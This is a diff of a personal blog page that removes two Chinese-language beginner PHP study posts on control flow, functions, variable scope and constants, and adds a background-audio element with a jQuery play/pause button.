-              <time title="Created: 2020-05-22 00:49:29 / Modified: 00:49:36" itemprop="dateCreated datePublished" datetime="2020-05-22T00:49:29+08:00">2020-05-22</time>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <p>@<a href="入门学习第四弹">TOC</a></p>
-<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>上次对运算符以及循环语句进行了学习方面的总结，这次就进入函数和数组的学习了。</p>
-<h1 id="switch语句、if-else语句"><a href="#switch语句、if-else语句" class="headerlink" title="switch语句、if else语句"></a>switch语句、if else语句</h1><p>个人感觉没啥好总结的，和其他语言上的用法差不多。</p>
-<h2 id="switch"><a href="#switch" class="headerlink" title="switch"></a>switch</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a=<span class="number">1</span>;</span><br><span class="line"><span class="keyword">switch</span>($a)</span><br><span class="line">&#123;</span><br><span class="line">   <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">"您给变量a赋值1！"</span>；</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">   <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">"您给变量a赋值2！"</span>;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">   <span class="keyword">default</span> :</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">"未检测到您赋值操作!!"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<h2 id="if-else"><a href="#if-else" class="headerlink" title="if else"></a>if else</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a=<span class="number">1</span>;</span><br><span class="line"><span class="keyword">if</span>($a&gt;<span class="number">0</span>)&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"变量a的值大于0！"</span>;</span><br><span class="line">&#125;<span class="keyword">elseif</span>($a=<span class="number">0</span>)&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"变量a的值等于0！"</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"变量a的值小于0！"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<h1 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h1><h2 id="自定义函数"><a href="#自定义函数" class="headerlink" title="自定义函数"></a>自定义函数</h2><p>在PHP中，函数是用<code>function</code>来定义的。</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">add</span><span class="params">($a,$b)</span></span>&#123;</span><br><span class="line">   <span class="keyword">echo</span> $a+$b;</span><br><span class="line">   <span class="comment">//return ...</span></span><br><span class="line">&#125;</span><br><span class="line">add(<span class="number">1</span>,<span class="number">2</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<p>上面的<code>return</code>可以不写，也可以写。return是一个返回值，如果把函数中的<code>echo</code>改成<code>return</code>就无法输出，因为函数只是返回了这个值而不进行输出。</p>
-<h2 id="变量范围"><a href="#变量范围" class="headerlink" title="变量范围"></a>变量范围</h2><blockquote>
-<p>变量范围即它定义的上下文背景（也就是它的生效范围）。</p>
-</blockquote>
-<p>PHP的变量范围有<strong>局部变量、全局变量以及静态变量</strong>。</p>
-<h3 id="局部变量"><a href="#局部变量" class="headerlink" title="局部变量"></a>局部变量</h3><p>局部变量就是在函数中定义的变量，在函数的外部无法使用。</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">a</span><span class="params">()</span></span>&#123;</span><br><span class="line">	$a=<span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> $a;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<p>输出的结果会提示错误。<br><strong>执行完毕后函数内部的动态变量都将被释放。</strong><br>也就是说在执行过后函数外部也可以定义一个同样名字的变量。</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">a</span><span class="params">()</span></span>&#123;</span><br><span class="line">	$a=<span class="number">1</span>;</span><br><span class="line">	<span class="keyword">echo</span> $a;</span><br><span class="line">&#125;</span><br><span class="line">$a=<span class="number">2</span>;</span><br><span class="line"><span class="keyword">echo</span> $a;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<p>这个就不会报错。</p>
-<h3 id="全局变量"><a href="#全局变量" class="headerlink" title="全局变量"></a>全局变量</h3><p>全局变量就是在函数外定义的变量称为全局变量，作用域范围在定义变量开始到本程序文件的末尾。</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a=<span class="number">1</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">a</span><span class="params">()</span></span>&#123;</span><br><span class="line">	</span><br><span class="line">	$b=<span class="number">1</span>;</span><br><span class="line">	<span class="keyword">echo</span> $a+$b;</span><br><span class="line">&#125;</span><br><span class="line">a();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<p>不过这样直接在函数中引用全局变量会报错，需要用<code>global</code>关键字声明一下。</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a=<span class="number">1</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">a</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">global</span> $a;</span><br><span class="line">	$b=<span class="number">1</span>;</span><br><span class="line">	<span class="keyword">echo</span> $a+$b;</span><br><span class="line">&#125;</span><br><span class="line">a();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<p><strong>在常量方面可以直接使用而不用像变量一样需要声明。</strong></p>
-<h3 id="静态变量"><a href="#静态变量" class="headerlink" title="静态变量"></a>静态变量</h3><p>静态变量仅在局部函数域中存在，但当程序执行离开此作用域时，其值并不丢失。<br>在我理解就是，静态变量就是可以时刻刷新的变量。</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">a</span><span class="params">()</span></span>&#123;</span><br><span class="line">	$a=<span class="number">1</span>;</span><br><span class="line">	<span class="keyword">echo</span> ++$a;</span><br><span class="line">&#125;</span><br><span class="line">a();</span><br><span class="line">a();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<p>在这个代码中，会输出两次1。</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">a</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">static</span> $a=<span class="number">1</span>;</span><br><span class="line">	<span class="keyword">echo</span> ++$a;</span><br><span class="line">&#125;</span><br><span class="line">a();</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;br /&gt;'</span>;</span><br><span class="line">a();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<p>这次用<code>static</code>关键字声明之后，输出的结果就会变为<strong>2 3</strong> 。</p>
-<h2 id="参数传递、可变函数"><a href="#参数传递、可变函数" class="headerlink" title="参数传递、可变函数"></a>参数传递、可变函数</h2><h3 id="参数传递"><a href="#参数传递" class="headerlink" title="参数传递"></a>参数传递</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>、按值传参</span><br><span class="line"><span class="number">2</span>、引用传参</span><br><span class="line"><span class="number">3</span>、可变长度参数</span><br><span class="line"><span class="number">4</span>、函数的默认值</span><br></pre></td></tr></table></figure>
-<h4 id="按值传参"><a href="#按值传参" class="headerlink" title="按值传参"></a>按值传参</h4><p>在PHP语言中，若不声明传参方式，默认使用的就是这个方式。</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">test</span><span class="params">($a)</span></span>&#123;</span><br><span class="line">     $a=<span class="string">"这个是"</span>.$a;</span><br><span class="line">     <span class="keyword">echo</span> $a;</span><br><span class="line">&#125;</span><br><span class="line">$i=<span class="string">"按值传参"</span>;</span><br><span class="line">test($i);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;/ br&gt;'</span>;</span><br><span class="line"><span class="keyword">echo</span> $i;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<p><img src="https://img-blog.csdnimg.cn/20200521215510896.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MDQxNzIz,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>这样子做，不会影响变量<strong>i</strong>的值</p>
-<h4 id="按引用传参"><a href="#按引用传参" class="headerlink" title="按引用传参"></a>按引用传参</h4><p>总结就是按引用传参会改变变量的值</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">model</span><span class="params">(&amp;$a)</span></span>&#123;</span><br><span class="line">  <span class="keyword">echo</span> ++$a;</span><br><span class="line">&#125;</span><br><span class="line">$i=<span class="number">1</span>;</span><br><span class="line">model($i);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;br /&gt;'</span>.$i;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<p><img src="https://img-blog.csdnimg.cn/20200521220124990.png" alt="在这里插入图片描述"></p>
-<h4 id="可变长度参数"><a href="#可变长度参数" class="headerlink" title="可变长度参数"></a>可变长度参数</h4><p>是PHP提供给我们的可以直接使用的，主要有三个</p>
-<blockquote>
-<p>func_get_args();<br>func_get_arg();<br>func_num_args();</p>
-</blockquote>
-<p><strong>func_get_args()</strong> 是获取参数，个人理解是返回的是数组类型，<br><strong>func_get_args()</strong> 可以理解为获取数组中的某一个数值，需要加一个数字，<br><strong>func_num_args()</strong> 是返回的函数传入的参数的个数<br>在函数中直接调用输出的话目前学的是无法显示出来，可以用前面说的<strong>var_dump</strong>来查看</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">model</span><span class="params">()</span></span>&#123;</span><br><span class="line">   var_dump(func_get_args());</span><br><span class="line">   <span class="keyword">echo</span> <span class="string">'&lt;br /&gt;'</span>;</span><br><span class="line">   var_dump(func_get_arg(<span class="number">1</span>));</span><br><span class="line">   <span class="keyword">echo</span> <span class="string">'&lt;br /&gt;'</span>;</span><br><span class="line">   var_dump(func_num_args());</span><br><span class="line">&#125;</span><br><span class="line">model(<span class="number">10</span>,<span class="string">"可变长度参数"</span>,<span class="number">12</span>,<span class="number">666</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<p><img src="https://img-blog.csdnimg.cn/20200521234733324.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MDQxNzIz,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<h4 id="函数的默认值"><a href="#函数的默认值" class="headerlink" title="函数的默认值"></a>函数的默认值</h4><p>函数默认值就是在创建函数时就给函数里的变量赋予了一个值。</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">model</span><span class="params">($a=<span class="string">"函数的默认值"</span>)</span></span>&#123;</span><br><span class="line">   <span class="keyword">echo</span> $a.<span class="string">'&lt;br /&gt;'</span>;</span><br><span class="line">&#125;</span><br><span class="line">model();</span><br><span class="line">model(<span class="number">20</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<p><img src="https://img-blog.csdnimg.cn/20200521220650108.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MDQxNzIz,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><strong>在加默认值时，多个变量的话应该是从右往左加！！！</strong></p>
-<h3 id="可变函数"><a href="#可变函数" class="headerlink" title="可变函数"></a>可变函数</h3><blockquote>
-<p>可变函数不能用于例如echo、print、unset()、isset()、empty()、include、require以及类似的语言结构，需要使用自己的包装函数来将这些结构用作可变函数。</p>
-</blockquote>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">model</span><span class="params">()</span></span>&#123;</span><br><span class="line">   <span class="keyword">echo</span> <span class="string">"这是一个函数！！"</span>;</span><br><span class="line">&#125;</span><br><span class="line">$i=<span class="string">'model'</span>;</span><br><span class="line">$i();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<p><img src="https://img-blog.csdnimg.cn/20200521235940327.png" alt="在这里插入图片描述"><br>可变函数使用，加上引号（单引号，双引号都可以）。</p>
-<h2 id="递归函数"><a href="#递归函数" class="headerlink" title="递归函数"></a>递归函数</h2><p>递归函数就是在函数里面再调用一次自身函数，简称无形套娃。</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">model</span><span class="params">($a)</span></span>&#123;</span><br><span class="line">   <span class="keyword">echo</span> $a.<span class="string">'&lt;br /&gt;'</span>;</span><br><span class="line">   <span class="keyword">if</span>($a&gt;<span class="number">0</span>)&#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">"这是递归函数"</span>.<span class="string">'&lt;br /&gt;'</span>;</span><br><span class="line">      model($a<span class="number">-1</span>);</span><br><span class="line">   &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">"函数结束"</span>.<span class="string">'&lt;br /&gt;'</span>;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">echo</span> $a.<span class="string">'&lt;br /&gt;'</span>;</span><br><span class="line">&#125;</span><br><span class="line">model(<span class="number">5</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<p><img src="https://img-blog.csdnimg.cn/20200522001416804.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MDQxNzIz,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><strong>使用递归函数需要有适当的循环结束条件，避免占用内存过大。</strong></p>
-<h2 id="内置函数"><a href="#内置函数" class="headerlink" title="内置函数"></a>内置函数</h2><h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><blockquote>
-<p>PHP 的真正威力源自于它的函数。 在 PHP 中，提供了超过 1000 个内建的函数</p>
-</blockquote>
-<p>可以自己了解，比较多，慢慢在学习使用过程中会了解到。</p>
-<blockquote>
-<p>boolval    获取变量的布尔值<br>debug_zval_dump    查看一个变量在zend引擎中的引用计数、类型信息<br>doubleval    floatval 的别名<br>empty    检查一个变量是否为空<br>floatval    获取变量的浮点值<br>get_defined_vars    返回由所有已定义变量所组成的数组<br>get_resource_type    返回资源（resource）类型<br>gettype    获取变量的类型<br>import_request_variables    将 GET／POST／Cookie 变量导入到全局作用域中<br>intval    获取变量的整数值<br>is_array    检测变量是否是数组<br>is_bool    检测变量是否是布尔型<br>is_callable    检测参数是否为合法的可调用结构<br>is_double    is_float 的别名<br>is_float    检测变量是否是浮点型<br>is_int    检测变量是否是整数<br>is_integer    is_int 的别名<br>is_iterable    检测变量的内容是否是一个可迭代的值<br>is_long    is_int 的别名<br>is_null    检测变量是否为 NULL<br>is_numeric    检测变量是否为数字或数字字符串<br>is_object    检测变量是否是一个对象<br>is_real    is_float 的别名<br>is_resource    检测变量是否为资源类型<br>is_scalar    检测变量是否是一个标量<br>is_string    检测变量是否是字符串<br>isset    检测变量是否已设置并且非 NULL<br>print_r    打印变量，输出易于阅读的信息。<br>serialize    序列化对象<br>settype    设置变量的类型<br>strval    获取变量的字符串值<br>unserialize    从已存储的表示中创建 PHP 的值<br>unset    释放给定的变量<br>var_dump    打印变量的相关信息<br>var_export    输出或返回一个变量，以字符串形式表示</p>
-</blockquote>
-<p>简单的罗列出了一点函数。<br>详细的请看<a href="https://www.php.net/manual/zh/functions.internal.php" target="_blank" rel="noopener">PHP手册</a>。</p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-        
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="en">
-    <link itemprop="mainEntityOfPage" href="http://momaxx.github.io/2020/04/14/PHP%E5%AD%A6%E4%B9%A0%E7%AC%AC%E4%BA%8C%E5%BC%B9/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="moMaxX">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Momax's blog">
-    </span>
-      <header class="post-header">
-        <h1 class="post-title" itemprop="name headline">
-          
-            <a href="/2020/04/14/PHP%E5%AD%A6%E4%B9%A0%E7%AC%AC%E4%BA%8C%E5%BC%B9/" class="post-title-link" itemprop="url">PHP学习第二弹</a>
-        </h1>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-              
-
-              <time title="Created: 2020-04-14 00:12:05 / Modified: 00:12:12" itemprop="dateCreated datePublished" datetime="2020-04-14T00:12:05+08:00">2020-04-14</time>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <p>@<a href="php学习总结">TOC</a></p>
-<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><pre><code>上次对于PHP的变量进行了学习，这一周就针对常量进行了简单的学习，顺便记录一下，并且补充一下上周有关变量的一些东西。</code></pre><h2 id="变量的补充"><a href="#变量的补充" class="headerlink" title="变量的补充"></a>变量的补充</h2><p>上周学习了变量的基本种类，以及几个作用域，但是关于变量的类型以及赋值，输出没有写到，补充回来。<br><strong>变量的类型</strong></p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">整数</span><br><span class="line">浮点数</span><br><span class="line">逻辑（布尔类型）</span><br><span class="line">字符串</span><br><span class="line">数组</span><br><span class="line">对象</span><br><span class="line">资源</span><br><span class="line">null值</span><br></pre></td></tr></table></figure>
-<p>前面几个不用说，和其他语言差不多，先看一个例子<br><img src="https://img-blog.csdnimg.cn/2020040818035174.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MDQxNzIz,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>在上面图片中，运用了<strong>var_dump()</strong> 来显示变量的类型以及变量的值。<strong>unset()</strong> 用于删除变量。<br><strong>字符串的赋值</strong><br>字符串赋值有几种方法：</p>
-<blockquote>
-<p>1、单引号  如： $a=’hello!’<br>2、双引号  如： $a=”hello!”</p>
-<p>3、&lt;&lt;&lt;变量名   变量值  变量名； 如：$a=&lt;&lt;&lt;max  666  max;</p>
-</blockquote>
-<h2 id="常量"><a href="#常量" class="headerlink" title="常量"></a>常量</h2><p>常量本人感觉和变量差别不大，只是定义方式不一样。<br>不同的是，常量一经定义，值无法发生改变，变量可以。</p>
-<h3 id="常量的定义"><a href="#常量的定义" class="headerlink" title="常量的定义"></a>常量的定义</h3><p>常量的定义与变量不同，变量直接<strong>$变量名字</strong>来定义，常量的定义格式为：<br><strong>define(‘常量名字’，常量值)</strong>或者<strong>define(“常量名字”，常量值)</strong>两种格式</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">define(<span class="string">'MY_NAME'</span>,<span class="string">'张三'</span>);</span><br><span class="line"><span class="keyword">echo</span> MY_NAME;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<p>需要注意，在对于常量的输出时，不能在常量名字上加上引号。</p>
-<h3 id="常量对于变量的区别"><a href="#常量对于变量的区别" class="headerlink" title="常量对于变量的区别"></a>常量对于变量的区别</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">常量不用<span class="variable">$</span>来定义，而用define()来定义</span><br><span class="line">常量可以在全局使用，而不用局限于变量的作用规则</span><br><span class="line">常量一经定义无法重新定义</span><br><span class="line">常量的数据类型只能是 布尔型，整型，浮点型，字符串</span><br></pre></td></tr></table></figure>
-<h3 id="常量的命名规则"><a href="#常量的命名规则" class="headerlink" title="常量的命名规则"></a>常量的命名规则</h3><p>与变量一样，只能由字母，数字，下划线构成，且不能用数字开头。<br>在常量命名中，按照习惯都是大写字母，但是用小写字母不会报错。<br><img src="https://img-blog.csdnimg.cn/2020040818275222.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MDQxNzIz,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<h3 id="预定义常量"><a href="#预定义常量" class="headerlink" title="预定义常量"></a>预定义常量</h3><p>在PHP中，存在许多内核定义过的常量名字，交做预定义常量。<br>可以通过一个函数<strong>print_r(get_defined_constants())</strong>来查看。<br><img src="https://img-blog.csdnimg.cn/20200408183205873.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MDQxNzIz,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<h4 id="魔术常量"><a href="#魔术常量" class="headerlink" title="魔术常量"></a>魔术常量</h4><p>常见的魔术常量：<a href="https://www.php.net/manual/zh/language.constants.predefined.php" target="_blank" rel="noopener">在这里</a><br>里面有具体的说法，在这里，我就简单的记录一下。<br><strong><strong>FILE</strong></strong><br>展示当前的文件路径和文件名<br><img src="https://img-blog.csdnimg.cn/20200408183819886.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MDQxNzIz,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><strong><strong>LINE</strong></strong><br>展示当前的行数。<br><img src="https://img-blog.csdnimg.cn/20200408184003454.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MDQxNzIz,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><strong>在这里要注意，预定义常量名字是不区分大小写的。</strong></p>
-<h2 id="结尾"><a href="#结尾" class="headerlink" title="结尾"></a>结尾</h2><p>在这里就简单的写了这两种基本的魔术变量。<br>下次来学习运算符方面的知识</p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-  </div>
-
-  
-  <nav class="pagination">
-    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right" aria-label="Next page"></i></a>
-  </nav>
-
-
-
-          </div>
-          
+<audio id="bgaudio" loop="loop" preload="none"> 
+  <source src=http://cdn.calm.com/scenes/scene-Qqkzy9k7Eo.m4a?v=1418162240715 type="audio/mpeg">
+</audio>
 
 <script>
-  window.addEventListener('tabs:register', () => {
-    let activeClass = CONFIG.comments.activeClass;
-    if (CONFIG.comments.storage) {
-      activeClass = localStorage.getItem('comments_active') || activeClass;
-    }
-    if (activeClass) {
-      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
-      if (activeTab) {
-        activeTab.click();
-      }
+$(document).ready(function(){
+  //播放按钮点击
+  var audio = $("#bgaudio")[0];
+  var img = $("#play-img")[0];
+  $("#play-button").click(function(){ 
+    if (audio.paused || audio.ended) {
+      audio.play();
+      img.src = "/images/playback_pause.png";
+    } else {
+      audio.pause();
+      img.src = "/images/playback_play.png";
     }
   });
-  if (CONFIG.comments.storage) {
-    window.addEventListener('tabs:click', event => {
-      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
-      let commentClass = event.target.classList[1];
-      localStorage.setItem('comments_active', commentClass);
-    });
-  }
+});
 </script>
 
-        </div>
-          
-  
-  <div class="toggle sidebar-toggle">
-    <span class="toggle-line toggle-line-first"></span>
-    <span class="toggle-line toggle-line-middle"></span>
